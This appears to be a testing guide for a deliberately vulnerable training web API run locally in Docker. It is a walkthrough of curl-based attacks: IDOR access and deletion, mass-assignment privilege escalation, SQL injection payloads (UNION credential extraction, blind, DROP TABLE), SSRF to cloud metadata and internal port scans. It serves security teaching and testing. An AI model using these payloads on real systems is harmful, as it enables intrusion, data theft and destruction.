# Security Testing Guide
## Damn Vulnerable Web API

This guide provides step-by-step instructions for testing each vulnerability.

---

## Prerequisites

1. **Start the application:**
   ```bash
   docker-compose up --build
   ```

2. **Install testing tools (optional):**
   - curl (command line)
   - Postman (GUI)
   - OWASP ZAP (DAST)
   - Burp Suite (manual testing)
   - jq (JSON parsing)

---

## Test Suite 1: API2:2023 - Broken Authentication

### 1.1 Weak Password Registration

**Description:** The API allows registration with extremely weak passwords.

```bash
# Register with password "1"
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
-d '{
    "username": "weakuser",
    "password": "1",
    "email": "weak@test.com",
    "fullName": "Weak User"
  }'
```

**Expected Result:** ? Registration successful (should fail but doesn't)

**Evidence:** Screenshot showing successful registration

---

### 1.2 Sensitive Data Logging

**Description:** Passwords are logged in plain text.

```bash
# Login
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}'

# Check logs
docker logs vulnerable-api | grep -i password
```

**Expected Result:** Passwords visible in logs

**Evidence:** Log excerpt showing plain text passwords

---

### 1.3 JWT Token Analysis

**Description:** JWT tokens contain predictable information and use hardcoded secrets.

```bash
# Login and capture token
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' | jq -r '.token')

echo $TOKEN

# Decode JWT (use jwt.io or jwt-cli)
echo $TOKEN | cut -d '.' -f2 | base64 -d 2>/dev/null | jq
```

**Expected Result:** JWT contains user ID, username, role. Token is valid for 365 days.

**Evidence:** Decoded JWT payload showing long expiration

---

## Test Suite 2: API1:2023 - BOLA/IDOR

### 2.1 Unauthorized Data Access

**Description:** Any authenticated user can access any other user's sensitive data.

```bash
# Step 1: Login as user 'john' (ID: 2)
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' | jq -r '.token')

# Step 2: Access own data (authorized)
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/user/2 | jq

# Step 3: Access admin data (unauthorized but works!)
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/user/1 | jq

# Step 4: Access another user (jane, ID: 3)
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/user/3 | jq
```

**Expected Result:** ? All requests succeed, exposing:
- Credit card numbers
- Addresses
- Phone numbers
- Admin status

**Evidence:** 
- Response showing admin's credit card
- Response showing jane's personal data
- Screenshot showing data from multiple users

---

### 2.2 Unauthorized Deletion

**Description:** Users can delete other users' accounts.

```bash
# Login as john
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' | jq -r '.token')

# Try to delete admin account
curl -X DELETE \
  -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/user/1

# Verify deletion
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/user/1
```

**Expected Result:** Admin account deleted by regular user

---

## Test Suite 3: API3:2023 - Mass Assignment

### 3.1 Privilege Escalation

**Description:** Regular users can escalate their privileges to admin.

```bash
# Step 1: Login as regular user
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' | jq -r '.token')

# Step 2: Check current status (isAdmin: false)
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/user/2 | jq '.isAdmin'

# Step 3: Update user with isAdmin=true
curl -X PUT http://localhost:5000/api/user/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "id": 2,
    "username": "john",
    "email": "john@vulnerable.api",
    "password": "12345",
    "fullName": "John Doe - Admin",
    "phoneNumber": "555-0002",
    "address": "456 User Lane",
    "isAdmin": true,
    "creditCardNumber": "4532-9876-5432-1098"
  }'

# Step 4: Verify escalation
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/user/2 | jq '.isAdmin'
```

**Expected Result:** `isAdmin` changes from `false` to `true`

**Evidence:** 
- Before: isAdmin = false
- After: isAdmin = true
- Screenshot of both states

---

### 3.2 Modify Other Users' Credit Cards

**Description:** Users can modify other users' sensitive data.

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' | jq -r '.token')

# Modify admin's credit card
curl -X PUT http://localhost:5000/api/user/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "id": 1,
    "username": "admin",
    "email": "admin@vulnerable.api",
    "password": "admin123",
    "fullName": "System Administrator",
    "phoneNumber": "555-0001",
    "address": "123 Admin Street",
    "isAdmin": true,
    "creditCardNumber": "0000-0000-0000-0000"
  }'

# Verify change
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/user/1 | jq '.creditCardNumber'
```

**Expected Result:** Admin's credit card number changed

---

## Test Suite 4: SQL Injection

### 4.1 Authentication Bypass

**Description:** Bypass filters using SQL injection.

```bash
# Basic OR injection
curl "http://localhost:5000/api/product/search?keyword=' OR '1'='1"

# Should return all products
```

**Expected Result:** All products returned

---

### 4.2 Data Extraction (Union-Based)

**Description:** Extract user credentials from the database.

```bash
# Union injection to get user data
curl "http://localhost:5000/api/product/search?keyword=' UNION SELECT id, username, password, email, 0, 0, 'HACKED', created_at FROM \"Users\"--"
```

**Expected Result:** User credentials displayed in product results

**Evidence:** Response showing usernames and passwords

---

### 4.3 Error-Based Injection

**Description:** Extract data through error messages.

```bash
# Cause error to extract data
curl "http://localhost:5000/api/product/search-by-price?minPrice=1 AND 1=CONVERT(int,(SELECT password FROM \"Users\" WHERE id=1))--&maxPrice=1000"
```

**Expected Result:** Error message containing password

---

### 4.4 Boolean-Based Blind Injection

**Description:** Extract data bit by bit using boolean logic.

```bash
# Test if first character of admin password is 'a'
curl "http://localhost:5000/api/product/search-by-price?minPrice=1 AND (SELECT SUBSTRING(password,1,1) FROM \"Users\" WHERE id=1)='a'--&maxPrice=1000"

# Test if first character is 'b'
curl "http://localhost:5000/api/product/search-by-price?minPrice=1 AND (SELECT SUBSTRING(password,1,1) FROM \"Users\" WHERE id=1)='b'--&maxPrice=1000"
```

**Expected Result:** Different responses based on condition

---

## Test Suite 5: API7:2023 - SSRF

### 5.1 Internal API Access

**Description:** Access internal API endpoints through SSRF.

```bash
# Access user endpoint through SSRF
curl "http://localhost:5000/api/utility/fetch-image?url=http://localhost:5000/api/user/1"

# Access all users
curl "http://localhost:5000/api/utility/fetch-image?url=http://localhost:5000/api/user"
```

**Expected Result:** Internal API data returned

---

### 5.2 Cloud Metadata Access

**Description:** Attempt to access cloud instance metadata.

```bash
# AWS metadata (if running on AWS)
curl "http://localhost:5000/api/utility/fetch-image?url=http://169.254.169.254/latest/meta-data/"

# Azure metadata (if running on Azure)
curl "http://localhost:5000/api/utility/fetch-image?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"
```

**Expected Result:** Metadata information returned

---

### 5.3 Port Scanning

**Description:** Scan internal network ports.

```bash
# Scan common ports
for port in 22 80 443 3306 5432 6379 8080; do
  echo "Testing port $port..."
  curl -s "http://localhost:5000/api/utility/fetch-image?url=http://192.168.1.1:$port" \
    -w "\nHTTP Status: %{http_code}\n"
done
```

**Expected Result:** Different responses for open/closed ports

---

### 5.4 Webhook SSRF

**Description:** Use webhook to attack internal services.

```bash
# Send malicious payload to internal service
curl -X POST "http://localhost:5000/api/utility/webhook?webhookUrl=http://internal-admin:8080/delete-all" \
  -H "Content-Type: application/json" \
  -d '{"action":"delete","target":"database"}'
```

**Expected Result:** Internal service receives malicious request

---

## Test Suite 6: API8:2023 - Security Misconfiguration

### 6.1 Information Disclosure in Errors

**Description:** Detailed error messages reveal system information.

```bash
# Trigger SQL error
curl "http://localhost:5000/api/product/search?keyword='; DROP TABLE Users;--"

# Check response for stack trace
```

**Expected Result:** Full stack trace and SQL query visible

---

### 6.2 Health Endpoint Information Leakage

**Description:** Health endpoint exposes sensitive system information.

```bash
curl http://localhost:5000/api/utility/health | jq
```

**Expected Result:** Exposed information includes:
- Environment name
- Machine name
- OS version
- Directory paths
- .NET version

---

### 6.3 Swagger in Production

**Description:** API documentation publicly accessible.

```bash
# Access Swagger JSON
curl http://localhost:5000/swagger/v1/swagger.json | jq

# Access Swagger UI
curl http://localhost:5000/
```

**Expected Result:** Complete API documentation accessible

---

### 6.4 CORS Misconfiguration

**Description:** CORS allows requests from any origin.

```bash
# Test CORS
curl -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -X OPTIONS \
  http://localhost:5000/api/auth/login \
  -v
```

**Expected Result:** Access-Control-Allow-Origin: *

---

## Test Suite 7: Combined Attack Scenarios

### 7.1 Complete Account Takeover

```bash
# 1. Discover admin username through SQL injection
curl "http://localhost:5000/api/product/search?keyword=' UNION SELECT id, username, password, email, 0, 0, 'x', created_at FROM \"Users\" WHERE \"IsAdmin\"=true--"

# 2. Extract admin password
# (Already visible in plain text: admin123)

# 3. Login as admin
ADMIN_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.token')

# 4. Access all user data
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://localhost:5000/api/user | jq
```

---

### 7.2 Privilege Escalation + Data Theft

```bash
# 1. Register as regular user
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","email":"att@test.com","fullName":"Attacker"}'

# 2. Login
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass"}' | jq -r '.token')

# 3. Get own user ID
USER_ID=$(curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/auth/verify | jq -r '.userId')

# 4. Escalate to admin
curl -X PUT http://localhost:5000/api/user/$USER_ID \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"id\":$USER_ID,\"username\":\"attacker\",\"email\":\"att@test.com\",\"password\":\"pass\",\"fullName\":\"Attacker Admin\",\"phoneNumber\":\"555\",\"address\":\"x\",\"isAdmin\":true}"

# 5. Access all sensitive data
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/user | jq '.[] | {username, email, creditCardNumber}'
```

---

## Automated Testing with OWASP ZAP

### Setup

```bash
# Pull ZAP Docker image
docker pull zaproxy/zap-stable

# Run ZAP with API access
docker run -u zap -p 8090:8090 -d \
  --name zap \
  --network vulnerable-network \
  zaproxy/zap-stable zap.sh -daemon \
  -host 0.0.0.0 -port 8090 \
  -config api.disablekey=true
```

### Run Scan

```bash
# Import OpenAPI spec
curl http://localhost:5000/swagger/v1/swagger.json > swagger.json

# Start ZAP scan
curl "http://localhost:8090/JSON/openapi/action/importUrl/?url=http://api:5000/swagger/v1/swagger.json"

# Run active scan
curl "http://localhost:8090/JSON/ascan/action/scan/?url=http://api:5000"

# Get results
curl "http://localhost:8090/JSON/core/view/alerts/" | jq
```

---

## Report Template

### Vulnerability Report: [Vulnerability Name]

**Severity:** Critical / High / Medium / Low

**OWASP Category:** API#:2023 - [Category Name]

**CWE:** CWE-XXX

**Description:**
[Detailed description of the vulnerability]

**Steps to Reproduce:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Proof of Concept:**
```bash
[Command or code]
```

**Impact:**
[What an attacker can achieve]

**Remediation:**
[How to fix the vulnerability]

**References:**
- [OWASP Link]
- [CWE Link]

---

## Notes

- Always test in isolated environments
- Document all findings with screenshots
- Test one vulnerability at a time
- Use unique identifiers in tests to track your data
- Clean up test data between runs

---

## Clean Up

```bash
# Stop all containers
docker-compose down -v

# Remove test data
docker volume rm vulnerableapi_postgres-data
```
